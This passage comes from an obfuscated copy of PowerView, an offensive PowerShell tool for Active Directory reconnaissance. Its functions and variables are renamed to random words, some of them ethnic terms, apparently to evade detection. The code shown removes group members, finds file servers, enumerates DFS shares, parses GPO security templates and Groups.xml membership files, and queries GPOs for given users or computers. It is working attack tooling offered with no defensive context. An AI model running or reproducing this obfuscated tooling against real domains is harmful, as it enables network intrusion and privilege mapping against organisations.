        if ($PSBoundParameters['Credential']) { $DoqjNWVs99['Credential'] = $QWHERWHL99 }
        $bRPMaoyU99 = leavening @ContextArguments
        if ($bRPMaoyU99) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($bRPMaoyU99.Context, $bRPMaoyU99.Identity)
            }
            catch {
                Write-Warning "[tweaking] Error finding the group identity '$NADQIykH99' : $_"
            }
        }
    }
    PROCESS {
        if ($Group) {
            ForEach ($IZCGoUsG99 in $LpDVgkcD99) {
                if ($IZCGoUsG99 -match '.+\\.+') {
                    $DoqjNWVs99['Identity'] = $IZCGoUsG99
                    $nyXTcIkr99 = leavening @ContextArguments
                    if ($nyXTcIkr99) {
                        $xcenmayP99 = $nyXTcIkr99.Identity
                    }
                }
                else {
                    $nyXTcIkr99 = $bRPMaoyU99
                    $xcenmayP99 = $IZCGoUsG99
                }
                Write-Verbose "[tweaking] Removing member '$IZCGoUsG99' from group '$NADQIykH99'"
                $IZCGoUsG99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($nyXTcIkr99.Context, $xcenmayP99)
                $Group.Members.Remove($IZCGoUsG99)
                $Group.Save()
            }
        }
    }
}
function Walmart {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function Karen {
            Param([String]$Path)
            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                $Temp = $Path.split('\\')[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }
        $qbMTjYnI99 = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ForEach ($cELjQvSA99 in $CmuysoGL99) {
                $qbMTjYnI99['Domain'] = $cELjQvSA99
                $PSOgPbQH99 = squintest @SearcherArguments
                $(ForEach($TptUmLTU99 in $PSOgPbQH99.FindAll()) {if ($TptUmLTU99.Properties['homedirectory']) {Karen($TptUmLTU99.Properties['homedirectory'])}if ($TptUmLTU99.Properties['scriptpath']) {Karen($TptUmLTU99.Properties['scriptpath'])}if ($TptUmLTU99.Properties['profilepath']) {Karen($TptUmLTU99.Properties['profilepath'])}}) | Sort-Object -Unique
            }
        }
        else {
            $PSOgPbQH99 = squintest @SearcherArguments
            $(ForEach($TptUmLTU99 in $PSOgPbQH99.FindAll()) {if ($TptUmLTU99.Properties['homedirectory']) {Karen($TptUmLTU99.Properties['homedirectory'])}if ($TptUmLTU99.Properties['scriptpath']) {Karen($TptUmLTU99.Properties['scriptpath'])}if ($TptUmLTU99.Properties['profilepath']) {Karen($TptUmLTU99.Properties['profilepath'])}}) | Sort-Object -Unique
        }
    }
}
function duns {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $AyGSXIrA99 = 'All'
    )
    BEGIN {
        $qbMTjYnI99 = @{}
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        function fizzle {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )
            $bin = $Pkt
            $YWUmReYP99 = [bitconverter]::ToUInt32($bin[0..3],0)
            $wsQElxzO99 = [bitconverter]::ToUInt32($bin[4..7],0)
            $xPNHlFSC99 = 8
            $pTlEazpu99 = @()
            for($i=1; $i -le $wsQElxzO99; $i++){
                $KoKYVDzH99 = $xPNHlFSC99
                $xsGbVLlQ99 = $xPNHlFSC99 + 1
                $ffvjDFzb99 = [bitconverter]::ToUInt16($bin[$KoKYVDzH99..$xsGbVLlQ99],0)
                $naWjeyuG99 = $xsGbVLlQ99 + 1
                $nCGCxdMk99 = $naWjeyuG99 + $ffvjDFzb99 - 1
                $CcpSrWrY99 = [System.Text.Encoding]::Unicode.GetString($bin[$naWjeyuG99..$nCGCxdMk99])
                $tebksdfP99 = $nCGCxdMk99 + 1
                $pmYmrNjk99 = $tebksdfP99 + 3
                $nKdDwsZX99 = [bitconverter]::ToUInt32($bin[$tebksdfP99..$pmYmrNjk99],0)
                $YXLJwgyi99 = $pmYmrNjk99 + 1
                $CwywrfcD99 = $YXLJwgyi99 + $nKdDwsZX99 - 1
                $OQGoWiJi99 = $bin[$YXLJwgyi99..$CwywrfcD99]
                switch -wildcard ($CcpSrWrY99) {
                    "\siteroot" {  }
                    "\domainroot*" {
                        $ktqioZpk99 = 0
                        $ODIirtNs99 = 15
                        $xEREgKSG99 = [byte[]]$OQGoWiJi99[$ktqioZpk99..$ODIirtNs99]
                        $guid = New-Object Guid(,$xEREgKSG99) # should match $fnBpiBJv99
                        $GXHPlgmS99 = $ODIirtNs99 + 1
                        $NxGUzzEd99 = $GXHPlgmS99 + 1
                        $sRYyFBbV99 = [bitconverter]::ToUInt16($OQGoWiJi99[$GXHPlgmS99..$NxGUzzEd99],0)
                        $ZTOCVLMI99 = $NxGUzzEd99 + 1
                        $fybKpOfY99 = $ZTOCVLMI99 + $sRYyFBbV99 - 1
                        $TmmbTQBk99 = [System.Text.Encoding]::Unicode.GetString($OQGoWiJi99[$ZTOCVLMI99..$fybKpOfY99])
                        $WiQNAzJP99 = $fybKpOfY99 + 1
                        $AUHuEGmq99 = $WiQNAzJP99 + 1
                        $MYtcuxKn99 = [bitconverter]::ToUInt16($OQGoWiJi99[$WiQNAzJP99..$AUHuEGmq99],0)
                        $iFZWJTWr99 = $AUHuEGmq99 + 1
                        $bCKWMPvt99 = $iFZWJTWr99 + $MYtcuxKn99 - 1
                        $wizSPPCb99 = [System.Text.Encoding]::Unicode.GetString($OQGoWiJi99[$iFZWJTWr99..$bCKWMPvt99])
                        $HTkujTuW99 = $bCKWMPvt99 + 1
                        $oFIeUBWW99 = $HTkujTuW99 + 3
                        $type = [bitconverter]::ToUInt32($OQGoWiJi99[$HTkujTuW99..$oFIeUBWW99],0)
                        $JTnZRHYN99 = $oFIeUBWW99 + 1
                        $uNAZlTRP99 = $JTnZRHYN99 + 3
                        $state = [bitconverter]::ToUInt32($OQGoWiJi99[$JTnZRHYN99..$uNAZlTRP99],0)
                        $lrEaZnbo99 = $uNAZlTRP99 + 1
                        $LKrxEayk99 = $lrEaZnbo99 + 1
                        $krRcTpUt99 = [bitconverter]::ToUInt16($OQGoWiJi99[$lrEaZnbo99..$LKrxEayk99],0)
                        $uACYbIsx99 = $LKrxEayk99 + 1
                        $XSffhrdK99 = $uACYbIsx99 + $krRcTpUt99 - 1
                        if ($krRcTpUt99 -gt 0)  {
                            $MWruLFIi99 = [System.Text.Encoding]::Unicode.GetString($OQGoWiJi99[$uACYbIsx99..$XSffhrdK99])
                        }
                        $LjHrBuXE99 = $XSffhrdK99 + 1
                        $LfBZpgFz99 = $LjHrBuXE99 + 7
                        $qbjHTrbl99 = $OQGoWiJi99[$LjHrBuXE99..$LfBZpgFz99] #dword lowDateTime #dword highdatetime
                        $wuWsQiUm99 = $LfBZpgFz99 + 1
                        $NArDEjxu99 = $wuWsQiUm99 + 7
                        $XpAqptwv99 = $OQGoWiJi99[$wuWsQiUm99..$NArDEjxu99]
                        $ChUyJGZq99 = $NArDEjxu99 + 1
                        $JRktmfbO99 = $ChUyJGZq99 + 7
                        $LAickQxR99 = $OQGoWiJi99[$ChUyJGZq99..$JRktmfbO99]
                        $pWRDoZJq99 = $JRktmfbO99  + 1
                        $wtIBCgzi99 = $pWRDoZJq99 + 3
                        $AyGSXIrA99 = [bitconverter]::ToUInt32($OQGoWiJi99[$pWRDoZJq99..$wtIBCgzi99],0)
                        $zmlYipxh99 = $wtIBCgzi99 + 1
                        $OtLAPgpw99 = $zmlYipxh99 + 3
                        $mxlMhjAC99 = [bitconverter]::ToUInt32($OQGoWiJi99[$zmlYipxh99..$OtLAPgpw99],0)
                        $UZZwBRSk99 = $OtLAPgpw99 + 1
                        $vObgjBCT99 = $UZZwBRSk99 + $mxlMhjAC99 - 1
                        $RCBwjHeo99 = $OQGoWiJi99[$UZZwBRSk99..$vObgjBCT99]
                        $bpRBEDKo99 = $vObgjBCT99 + 1
                        $xNwWOfTm99 = $bpRBEDKo99 + 3
                        $sPPnMhZe99 = [bitconverter]::ToUInt32($OQGoWiJi99[$bpRBEDKo99..$xNwWOfTm99],0)
                        $zFWAvTWX99 = $xNwWOfTm99 + 1
                        $LMaeGFug99 = $zFWAvTWX99 + $sPPnMhZe99 - 1
                        $xbojBAJn99 = $OQGoWiJi99[$zFWAvTWX99..$LMaeGFug99]
                        $IGIsFOeH99 = $LMaeGFug99 + 1
                        $xElZAkrO99 = $IGIsFOeH99 + 3
                        $ARZFkUWl99 = [bitconverter]::ToUInt32($OQGoWiJi99[$IGIsFOeH99..$xElZAkrO99],0)
                        $PBIZPaEc99 = 0
                        $qOZTaqOG99 = $PBIZPaEc99 + 3
                        $qXBDUVHZ99 = [bitconverter]::ToUInt32($RCBwjHeo99[$PBIZPaEc99..$qOZTaqOG99],0)
                        $FMrXbArZ99 = $qOZTaqOG99 + 1
                        for($j=1; $j -le $qXBDUVHZ99; $j++){
                            $lrcXtwvg99 = $FMrXbArZ99
                            $rDmLfwfr99 = $lrcXtwvg99 + 3
                            $kaCtuRsh99 = [bitconverter]::ToUInt32($RCBwjHeo99[$lrcXtwvg99..$rDmLfwfr99],0)
                            $tcPcfBax99 = $rDmLfwfr99 + 1
                            $xCEixvZk99 = $tcPcfBax99 + 7
                            $MyYIOMih99 = $RCBwjHeo99[$tcPcfBax99..$xCEixvZk99]
                            $ybkAjMjA99 = $xCEixvZk99 + 1
                            $GiZQnKvL99 = $ybkAjMjA99 + 3
                            $XNqYbOcs99 = [bitconverter]::ToUInt32($RCBwjHeo99[$ybkAjMjA99..$GiZQnKvL99],0)
                            $PmkQeHJt99 = $GiZQnKvL99 + 1
                            $ZxOQJrwX99 = $PmkQeHJt99 + 3
                            $PXAeSqHc99 = [bitconverter]::ToUInt32($RCBwjHeo99[$PmkQeHJt99..$ZxOQJrwX99],0)
                            $YgKfCeNV99 = $ZxOQJrwX99 + 1
                            $AOcmAbXJ99 = $YgKfCeNV99 + 1
                            $toyCDNGX99 = [bitconverter]::ToUInt16($RCBwjHeo99[$YgKfCeNV99..$AOcmAbXJ99],0)
                            $iVoGHlkF99 = $AOcmAbXJ99 + 1
                            $PyvpAvdM99 = $iVoGHlkF99 + $toyCDNGX99 - 1
                            $yyorWWog99 = [System.Text.Encoding]::Unicode.GetString($RCBwjHeo99[$iVoGHlkF99..$PyvpAvdM99])
                            $RxvXZVIu99 = $PyvpAvdM99 + 1
                            $DZPNXTAJ99 = $RxvXZVIu99 + 1
                            $zyDpmfVW99 = [bitconverter]::ToUInt16($RCBwjHeo99[$RxvXZVIu99..$DZPNXTAJ99],0)
                            $mEGjNIBe99 = $DZPNXTAJ99 + 1
                            $JgUneKHq99 = $mEGjNIBe99 + $zyDpmfVW99 - 1
                            $JkhogPpP99 = [System.Text.Encoding]::Unicode.GetString($RCBwjHeo99[$mEGjNIBe99..$JgUneKHq99])
                            $TLOcvjUK99 += "\\$yyorWWog99\$JkhogPpP99"
                            $FMrXbArZ99 = $JgUneKHq99 + 1
                        }
                    }
                }
                $xPNHlFSC99 = $CwywrfcD99 + 1
                $CZHSnKeF99 = @{
                    'Name' = $CcpSrWrY99
                    'Prefix' = $TmmbTQBk99
                    'TargetList' = $TLOcvjUK99
                }
                $pTlEazpu99 += New-Object -TypeName PSObject -Property $CZHSnKeF99
                $TmmbTQBk99 = $Null
                $CcpSrWrY99 = $Null
                $TLOcvjUK99 = $Null
            }
            $UNJmnqUi99 = @()
            $pTlEazpu99 | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $UNJmnqUi99 += $_.split('\')[2]
                    }
                }
            }
            $UNJmnqUi99
        }
        function compact {
            [CmdletBinding()]
            Param(
                [String]
                $CmuysoGL99,
                [String]
                $BffxXlHt99,
                [String]
                $vbyFupaI99,
                [String]
                $RVZhWaEH99 = 'Subtree',
                [Int]
                $rguZwVJP99 = 200,
                [Int]
                $CRJCwXfg99,
                [Switch]
                $iqiYBoee99,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
            )
            $EtxUldSn99 = squintest @PSBoundParameters
            if ($EtxUldSn99) {
                $HwmJBJOW99 = @()
                $EtxUldSn99.filter = '(&(objectClass=fTDfs))'
                try {
                    $IUnNdChl99 = $EtxUldSn99.FindAll()
                    $IUnNdChl99 | Where-Object {$_} | ForEach-Object {
                        $IzcJvFdA99 = $_.Properties
                        $AIJVGJvQ99 = $IzcJvFdA99.remoteservername
                        $Pkt = $IzcJvFdA99.pkt
                        $HwmJBJOW99 += $AIJVGJvQ99 | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$IzcJvFdA99.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[duns] compact error in parsing DFS share : $_"
                            }
                        }
                    }
                    if ($IUnNdChl99) {
                        try { $IUnNdChl99.dispose() }
                        catch {
                            Write-Verbose "[duns] compact error disposing of the Results object: $_"
                        }
                    }
                    $EtxUldSn99.dispose()
                    if ($pkt -and $pkt[0]) {
                        fizzle $pkt[0] | ForEach-Object {
                            if ($_ -ne 'null') {
                                New-Object -TypeName PSObject -Property @{'Name'=$IzcJvFdA99.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "[duns] compact error : $_"
                }
                $HwmJBJOW99 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
        function analogies {
            [CmdletBinding()]
            Param(
                [String]
                $CmuysoGL99,
                [String]
                $BffxXlHt99,
                [String]
                $vbyFupaI99,
                [String]
                $RVZhWaEH99 = 'Subtree',
                [Int]
                $rguZwVJP99 = 200,
                [Int]
                $CRJCwXfg99,
                [Switch]
                $iqiYBoee99,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
            )
            $EtxUldSn99 = squintest @PSBoundParameters
            if ($EtxUldSn99) {
                $HwmJBJOW99 = @()
                $EtxUldSn99.filter = '(&(objectClass=msDFS-Linkv2))'
                $Null = $EtxUldSn99.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))
                try {
                    $IUnNdChl99 = $EtxUldSn99.FindAll()
                    $IUnNdChl99 | Where-Object {$_} | ForEach-Object {
                        $IzcJvFdA99 = $_.Properties
                        $TLOcvjUK99 = $IzcJvFdA99.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($TLOcvjUK99[2..($TLOcvjUK99.Length-1)])
                        $HwmJBJOW99 += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $iPXYJHmg99 = $_.InnerText
                                if ( $iPXYJHmg99.Contains('\') ) {
                                    $UhCsgdhv99 = $iPXYJHmg99.split('\')[3]
                                    $UigfMgOQ99 = $IzcJvFdA99.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'="$UhCsgdhv99$UigfMgOQ99";'RemoteServerName'=$iPXYJHmg99.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[duns] analogies error in parsing target : $_"
                            }
                        }
                    }
                    if ($IUnNdChl99) {
                        try { $IUnNdChl99.dispose() }
                        catch {
                            Write-Verbose "[duns] Error disposing of the Results object: $_"
                        }
                    }
                    $EtxUldSn99.dispose()
                }
                catch {
                    Write-Warning "[duns] analogies error : $_"
                }
                $HwmJBJOW99 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
    }
    PROCESS {
        $HwmJBJOW99 = @()
        if ($PSBoundParameters['Domain']) {
            ForEach ($cELjQvSA99 in $CmuysoGL99) {
                $qbMTjYnI99['Domain'] = $cELjQvSA99
                if ($AyGSXIrA99 -match 'all|1') {
                    $HwmJBJOW99 += compact @SearcherArguments
                }
                if ($AyGSXIrA99 -match 'all|2') {
                    $HwmJBJOW99 += analogies @SearcherArguments
                }
            }
        }
        else {
            if ($AyGSXIrA99 -match 'all|1') {
                $HwmJBJOW99 += compact @SearcherArguments
            }
            if ($AyGSXIrA99 -match 'all|2') {
                $HwmJBJOW99 += analogies @SearcherArguments
            }
        }
        $HwmJBJOW99 | Sort-Object -Property ('RemoteServerName','Name') -Unique
    }
}
function Mexicans {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $RIjrCcMN99,
        [Switch]
        $Tcxfhgpw99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $BBZaKqhR99 = @{}
    }
    PROCESS {
        try {
            if (($RIjrCcMN99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $IAJeZHOR99 = "\\$((New-Object System.Uri($RIjrCcMN99)).Host)\SYSVOL"
                if (-not $BBZaKqhR99[$IAJeZHOR99]) {
                    hepper -Path $IAJeZHOR99 -QWHERWHL99 $QWHERWHL99
                    $BBZaKqhR99[$IAJeZHOR99] = $True
                }
            }
            $YegDiHuA99 = $RIjrCcMN99
            if (-not $YegDiHuA99.EndsWith('.inf')) {
                $YegDiHuA99 += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }
            Write-Verbose "[Mexicans] Parsing GptTmplPath: $YegDiHuA99"
            if ($PSBoundParameters['OutputObject']) {
                $MYcqiIkx99 = sprucing -Path $YegDiHuA99 -Tcxfhgpw99 -ErrorAction Stop
                if ($MYcqiIkx99) {
                    $MYcqiIkx99 | Add-Member Noteproperty 'Path' $YegDiHuA99
                    $MYcqiIkx99
                }
            }
            else {
                $MYcqiIkx99 = sprucing -Path $YegDiHuA99 -ErrorAction Stop
                if ($MYcqiIkx99) {
                    $MYcqiIkx99['Path'] = $YegDiHuA99
                    $MYcqiIkx99
                }
            }
        }
        catch {
            Write-Verbose "[Mexicans] Error parsing $YegDiHuA99 : $_"
        }
    }
    END {
        $BBZaKqhR99.Keys | ForEach-Object { grand -Path $_ }
    }
}
function Staubach {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $kYnYHdFW99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $BBZaKqhR99 = @{}
    }
    PROCESS {
        try {
            if (($kYnYHdFW99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $IAJeZHOR99 = "\\$((New-Object System.Uri($kYnYHdFW99)).Host)\SYSVOL"
                if (-not $BBZaKqhR99[$IAJeZHOR99]) {
                    hepper -Path $IAJeZHOR99 -QWHERWHL99 $QWHERWHL99
                    $BBZaKqhR99[$IAJeZHOR99] = $True
                }
            }
            [XML]$SPsQxsVv99 = Get-Content -Path $kYnYHdFW99 -ErrorAction Stop
            $SPsQxsVv99 | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {
                $PnKWBocM99 = $_.Properties.groupName
                $JqKuNPvR99 = $_.Properties.groupSid
                if (-not $JqKuNPvR99) {
                    if ($PnKWBocM99 -match 'Administrators') {
                        $JqKuNPvR99 = 'S-1-5-32-544'
                    }
                    elseif ($PnKWBocM99 -match 'Remote Desktop') {
                        $JqKuNPvR99 = 'S-1-5-32-555'
                    }
                    elseif ($PnKWBocM99 -match 'Guests') {
                        $JqKuNPvR99 = 'S-1-5-32-546'
                    }
                    else {
                        if ($PSBoundParameters['Credential']) {
                            $JqKuNPvR99 = Moroccans -PEicaWON99 $PnKWBocM99 -QWHERWHL99 $QWHERWHL99
                        }
                        else {
                            $JqKuNPvR99 = Moroccans -PEicaWON99 $PnKWBocM99
                        }
                    }
                }
                $LpDVgkcD99 = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }
                if ($LpDVgkcD99) {
                    if ($_.filters) {
                        $HXpClEIb99 = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        $HXpClEIb99 = $Null
                    }
                    if ($LpDVgkcD99 -isnot [System.Array]) { $LpDVgkcD99 = @($LpDVgkcD99) }
                    $hGBCzCeH99 = New-Object PSObject
                    $hGBCzCeH99 | Add-Member Noteproperty 'GPOPath' $vxXknuqZ99
                    $hGBCzCeH99 | Add-Member Noteproperty 'Filters' $HXpClEIb99
                    $hGBCzCeH99 | Add-Member Noteproperty 'GroupName' $PnKWBocM99
                    $hGBCzCeH99 | Add-Member Noteproperty 'GroupSID' $JqKuNPvR99
                    $hGBCzCeH99 | Add-Member Noteproperty 'GroupMemberOf' $Null
                    $hGBCzCeH99 | Add-Member Noteproperty 'GroupMembers' $LpDVgkcD99
                    $hGBCzCeH99.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    $hGBCzCeH99
                }
            }
        }
        catch {
            Write-Verbose "[Staubach] Error parsing $vxXknuqZ99 : $_"
        }
    }
    END {
        $BBZaKqhR99.Keys | ForEach-Object { grand -Path $_ }
    }
}
function Tahitians {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $NADQIykH99,
        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $MNRvXHGj99,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $xcenmayP99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $IzcJvFdA99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $lGQMWbBj99,
        [Switch]
        $iqiYBoee99,
        [Alias('ReturnOne')]
        [Switch]
        $kCjMYGtw99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $qbMTjYnI99 = @{}
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Properties']) { $qbMTjYnI99['Properties'] = $IzcJvFdA99 }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['SecurityMasks']) { $qbMTjYnI99['SecurityMasks'] = $lGQMWbBj99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        $iDrQmBWE99 = squintest @SearcherArguments
    }
    PROCESS {
        if ($iDrQmBWE99) {
            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
                $tZAoPtPN99 = @()
                if ($qbMTjYnI99['Properties']) {
                    $eNeuTler99 = $qbMTjYnI99['Properties']
                }
                $qbMTjYnI99['Properties'] = 'distinguishedname,dnshostname'
                $ZTpiMOiS99 = $Null
                if ($PSBoundParameters['ComputerIdentity']) {
                    $qbMTjYnI99['Identity'] = $MNRvXHGj99
                    $UEyZXQpH99 = beefsteaks @SearcherArguments -kCjMYGtw99 | Select-Object -First 1
                    if(-not $UEyZXQpH99) {
                        Write-Verbose "[Tahitians] Computer '$MNRvXHGj99' not found!"
                    }
                    $jVwQymgR99 = $UEyZXQpH99.distinguishedname
                    $ZTpiMOiS99 = $UEyZXQpH99.dnshostname
                }
                else {
                    $qbMTjYnI99['Identity'] = $xcenmayP99
                    $User = melodrama @SearcherArguments -kCjMYGtw99 | Select-Object -First 1
                    if(-not $User) {
                        Write-Verbose "[Tahitians] User '$xcenmayP99' not found!"
                    }
                    $jVwQymgR99 = $User.distinguishedname
                }
                $oynfoMeB99 = @()
                $oynfoMeB99 += $jVwQymgR99.split(',') | ForEach-Object {
                    if($_.startswith('OU=')) {
